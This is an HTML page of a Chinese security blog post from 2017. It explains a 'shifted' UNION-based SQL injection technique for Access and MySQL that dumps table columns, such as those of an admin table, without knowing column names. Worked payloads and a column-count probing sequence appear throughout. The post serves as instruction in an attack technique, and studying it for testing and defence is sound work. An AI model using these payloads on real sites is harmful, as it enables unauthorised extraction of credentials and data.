<!DOCTYPE html> <html lang="en"> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1" /> <title>移位溢注：告别依靠人品的偏移注入 · Chen's Blog</title> <meta name="description" content="介绍："> <meta name="keywords" content="介绍："> <link rel="icon" href="http://localhost:4000/assets/favicon.png"> <link rel="apple-touch-icon" href="http://localhost:4000/assets/touch-icon.png"> <link rel="stylesheet" href="http://localhost:4000/assets/core.css"> <link rel="canonical" href="http://localhost:4000/archives/2017-03-08/1"> <link rel="alternate" type="application/atom+xml" title="Chen's Blog" href="http://localhost:4000/feed.xml" /> <link href="/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" media="all" /> <script> var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?e4a42a371cc5994ee02b940034c29658"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s); })(); </script> </head> <body> <aside class="logo"> <a href="http://localhost:4000/"> <img src="/assets/avatar.jpg" class="logo-avatar"> </a> <span class="logo-prompt code">Back to Index</span> </aside> <article> <h1 class="title">EvilChen</h1> <div class="divider"></div> <center> <a href="https://github.com/gh0stkey" target="_blank">Github</a> | <a href="https://twitter.com/VulkeyChen" target="_blank">X (Twitter)</a> | <a href="/about" target="_blank">About</a> | <a href="/links" target="_blank">Links</a> </center> <div class="divider"></div> </article> <div id="content"> <article> <div class="center"> <h1 class="title">移位溢注：告别依靠人品的偏移注入</h1> <time class="code">March 8, 2017</time> </div> <div class="divider"></div> <h2 id="介绍"><strong>介绍</strong>：</h2> <p>在Access数据库类型注入的时候，我们获取不到列名(前提是有表名)，一般会选择使用偏移注入，但是这种注入方式往往借助的是个人的人品，且步骤繁琐。本文中我们研究了一种新的注入技术让“偏移注入不在需要人品”。在这里定义这种注入技术为：“移位溢注技术”。 它适用于ACCESS和MYSQL（任何版本）</p> <h2 id="正文"><strong>正文：</strong></h2> <p>我们先来看看普通的偏移注入步骤：</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.判断注入点
2.order by 判断长度
3.判断表名
4.联合查询
5.获取表中列数：**union select 1,2,3,4,..,\* from TABLE**
6.开始偏移注入：**TABLE as a inner join TABLE as b ona.id=b.id**
</code></pre></div></div> <p>由于步骤6的方法过于需要人品值，且语句繁琐，因此在这里，我们研究新的注入技术：</p> <p>首先来看看步骤6语句的整体意思：</p> <p>步骤6的语句，<strong>表示给TALBE取2个别名，然后分别用别名取查询TALBE的内容（表a和表b）；而on a.id = b.id 这样的条件是为了满足语法需求，实际并没有作用，因为相同内容的表，相同字段内容一定相同。</strong></p> <p>这时，我们再回过头来看步骤5：</p> <p><strong>由于联合查询中select后面添加数字的目的是为了让联合查询返回接结果和网站正常查询返回的结果的列数一致（不一致数据库会报错，页面无法显示），且*表示通配符，可以表示整个表格所有列；因此这里通过数字来占位，并使用*来替代TABLE中的所有列，使得联合查询可以完成，并推算出*的值。</strong></p> <p>这时候我们继续研究偏移注入的整体公式方法，发现即使使用多级偏移注入也需要一定的概率(人品值)才可以得到想要的结果，所以我们就尝试研究新的方法能不能替换这种不固定概率的方法。</p> <p>现在我们重新整理一下SQL语句，从联合查询开始：</p> <p>1.原union语句：<strong>union select 1,2,3,..,p..,n from TABLE</strong></p> <p>（p=页面爆出的数字，可能有多个p1,p2..；n=原网站查询的总列数；TALBE=我们获得的表名；下面开始就使用上述字母的定义）</p> <p>2.新语句：</p> <p><strong>union select 1,2,3,..,p-1,TABLE.*,p+k,..,nfrom TABLE where</strong> <strong>字段名</strong> <strong>=</strong> <strong>字段内容</strong></p> <p>–在p的位置爆出TALBE表中第一个字段的内容（其他位置还可能爆出更多内容）</p> <p>（这里如果存在已知字段名可以使用，没有就不用，一般id这个字段时存在的，可以使用id = 1来显示第一行）</p> <p><strong>union select1,2,3,..,p-2,TABLE.*,p+k-1,..,n from TABLE where</strong> <strong>字段名</strong> <strong>=</strong> <strong>字段内容</strong></p> <p>–在p的位置爆出TALBE表中第二个字段的内容（其他位置还可能爆出更多内容）</p> <p><strong>union select 1,2,3,..,p-3,TABLE.*,p+k-2,..,nfrom TABLE where</strong> <strong>字段名</strong> <strong>=</strong> <strong>字段内容</strong></p> <p>–在p的位置爆出TALBE表中第三个字段的内容（其他位置还可能爆出更多内容）</p> <p>注：这里一定是TALBE.<em>而不是</em></p> <p>3.1 <strong>以此类推可以爆出TALBE的每一列内容。</strong></p> <p>3.2 <strong>如果p&lt;k则没法爆出p+1列至k列的内容，如果n-p&lt;k则无法爆出第1列至k-(n-p)列</strong>。</p> <h2 id="原理"><strong>原理：</strong></h2> <p>1.由原语句：<strong>union select 1,2,3,..,p..,n-k,* from TABLE</strong> 可以得出该联合查询的目的是构造和原网站相同列数的查询结构，使得页面上可以显示对应的数字；这条语句相当于是做了两次查询并将它们的结果合并，第一次做了<strong>select 1,2,3,..,n-k from TALBE</strong> ，第二次做了<strong>select * from TALBE</strong> ，然后将它们的结果合并。</p> <p>这可以参考mysql的语句：<strong>select 1,2,3,4,5,admin.* from admin;</strong></p> <p><img src="/images/2017-03-08/0x00.jpg" alt="img" /></p> <p><img src="/images/2017-03-08/0x01.jpg" alt="img" /></p> <p><img src="/images/2017-03-08/0x02.jpg" alt="img" /></p> <p>2.只要满足原理1的要求，保障联合查询的结果和原网站查询的结果列数一致即可；因此可以将TALBE.*向前移动至页面显示的数字处来爆出TALBE列中的内容。</p> <p>这可以参考mysql的语句：</p><pre><code class="language-mysql">select 1,2,3,4,5,6,7,8,9,10 from newswhere id =1 union select 1,2,3,4,5,6,7,admin.* from admin;
select 1,2,3,4,5,6,7,8,9,10 from newswhere id =1 union select 1,2,3,admin.*,7,8,9,10 from admin;
</code></pre><p><strong>注：假设数字4、5在页面显示。</strong></p> <p>由下图可知，其实数据已近查询出来，但是页面没有显示，这个是通过平移查询结果到页面显示的数字上去，即可爆出敏感字段。</p> <p><img src="/images/2017-03-08/0x03.jpg" alt="img" /></p> <p><img src="/images/2017-03-08/0x04.jpg" alt="img" /></p> <h2 id="例子"><strong>例子：</strong></h2> <p><strong>步骤1：</strong>判断注入点是否存在</p> <p><img src="/images/2017-03-08/0x05.jpg" alt="img" /></p> <p>步骤2：</p> <p><img src="/images/2017-03-08/0x06.jpg" alt="img" /></p> <p><img src="/images/2017-03-08/0x07.jpg" alt="img" /></p> <p><strong>步骤3：</strong>获得表名(必备条件) and exists(select * from admin)</p> <p><img src="/images/2017-03-08/0x08.jpg" alt="img" /></p> <p><strong>步骤4：</strong>获取不了列名（当尝试多个常用字段名以后，最终还是发现无法获得字段名）</p> <p><strong>步骤5：</strong>使用联合查询(union select)</p> <p><img src="/images/2017-03-08/0x09.jpg" alt="img" /></p> <p><img src="/images/2017-03-08/0x010.jpg" alt="img" /></p> <p>步骤6：使用新注入技术方法</p> <p>（1）获取admin表的列数：</p><pre><code class="language-mysql">UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,*from admin #--返回错误页面

UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,*from admin #--返回错误页面

UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,*from admin #--返回错误页面

UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,*from admin #--返回错误页面
.....

UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,*from admin #--返回步骤5页面，因此admin表的列数为6
</code></pre><p><img src="/images/2017-03-08/0x011.jpg" alt="img" /></p> <p><img src="/images/2017-03-08/0x012.jpg" alt="img" /></p> <p><img src="/images/2017-03-08/0x013.jpg" alt="img" /></p> <p>（2）由于网页中包含连续数字，表示可以显示连续的查询结果，构造SQL语句查询前四列第一行。</p><pre><code class="language-mysql">UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35from admin
</code></pre><p><img src="/images/2017-03-08/0x014.jpg" alt="img" /></p> <p><img src="/images/2017-03-08/0x015.jpg" alt="img" /></p><pre><code class="language-mysql">UNION SELECT1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35from admin where id = 3
</code></pre><p><img src="/images/2017-03-08/0x016.jpg" alt="img" /></p> <h2 id="总结"><strong>总结</strong></h2> <p>在这里我们命名这种新注入技术为”移位溢注”。由此如果MYSQL小于5.0的情况下所具备的条件和ACCESS一样，也可以使用此方法注入，如果是MYSQL大于5.0的版本，使用此方法可以省去获得列名的步骤。</p> <p><strong>文章研究：</strong>gh0stkey &amp; Seagull</p> </article> <div class="page-navigation code"> <a class="next" href="http://localhost:4000/archives/2017-03-29/1" title="NEXT: 文件寄生——NTFS文件流实际应用">&lt;&lt;</a> <span> &middot; </span> <a class="home" href="http://localhost:4000/" title="Back to Index">INDEX</a> </div> </div> <div class="footer"> <span class="block">&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-2021</span> </div> <script src="/fancybox/lib/jquery-1.10.2.min.js"></script> <script type="text/javascript" src="/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script> <script> $(document).ready(function() { $("article img").each(function() { var strA = "<a style='text-decoration: none;' id='imgid' href='" + this.src + "'></a>"; $(this).wrapAll(strA); }); $(".block").html("&lt;/&gt; Copyright &copy; Chen's Blog (GH0ST.CN) 2016-" + (new Date()).getFullYear()); }); $("#imgid").fancybox({ openEffect : 'elastic', closeEffect : 'elastic', }); </script> </body> </html>
